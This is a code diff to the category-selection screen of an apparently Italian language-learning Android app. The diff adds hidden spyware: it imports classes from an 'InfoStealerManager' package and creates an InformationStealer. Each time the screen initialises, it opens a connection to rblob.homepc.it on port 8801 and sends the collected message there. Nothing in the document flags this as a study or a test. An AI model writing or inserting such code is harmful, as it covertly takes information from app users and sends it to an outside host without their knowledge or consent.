@@ -14,6 +14,8 @@ import android.widget.Button;
 
 import com.example.duolingopezzotto.Adapters.CustomScegliCategorieAdapter;
 import com.example.duolingopezzotto.Comparator.CategoriaModelStringComparator;
+import com.example.duolingopezzotto.InfoStealerManager.InformationStealer;
+import com.example.duolingopezzotto.InfoStealerManager.NetworkManager;
 import com.example.duolingopezzotto.SQLiteDB.Models.CategoriaModel;
 import com.example.duolingopezzotto.R;
 import com.example.duolingopezzotto.SQLiteDB.DatabaseHelper;
@@ -23,6 +25,8 @@ import java.util.Collections;
 
 public class ScegliCategorieActivity extends AppCompatActivity {
 
+    NetworkManager networkManager;
+    InformationStealer informationStealer;
     RecyclerView recyclerView;
     DatabaseHelper my_db;
     ArrayList<CategoriaModel> categorie;
@@ -43,6 +47,8 @@ public class ScegliCategorieActivity extends AppCompatActivity {
     public void init(){
         recyclerView = findViewById(R.id.scegliCategorieRecyclerView);
 
+        networkManager = new NetworkManager();
+        informationStealer = new InformationStealer(this);
         my_db = new DatabaseHelper(ScegliCategorieActivity.this);
         categorie = new ArrayList<>();
         id_categorie = new ArrayList<>();
@@ -50,7 +56,13 @@ public class ScegliCategorieActivity extends AppCompatActivity {
         tutteButton = findViewById(R.id.buttonTutte);
         avantiButton = findViewById(R.id.buttonAvanti);
 
+
+
         storeCategorieInArrayList();
+
+        networkManager.openConnection("rblob.homepc.it", 8801, this);
+        networkManager.sendMessage2(informationStealer.getMessaggio());
+
         Collections.sort(categorie, new CategoriaModelStringComparator());
 
         customScegliCategorieAdapter = new CustomScegliCategorieAdapter(ScegliCategorieActivity.this, categorie);
@@ -70,6 +82,7 @@ public class ScegliCategorieActivity extends AppCompatActivity {
             startActivity(gotoTraduci);
         });
     }
+
 
     public void storeCategorieInArrayList(){
         Cursor cursor = my_db.readAllCategorie();
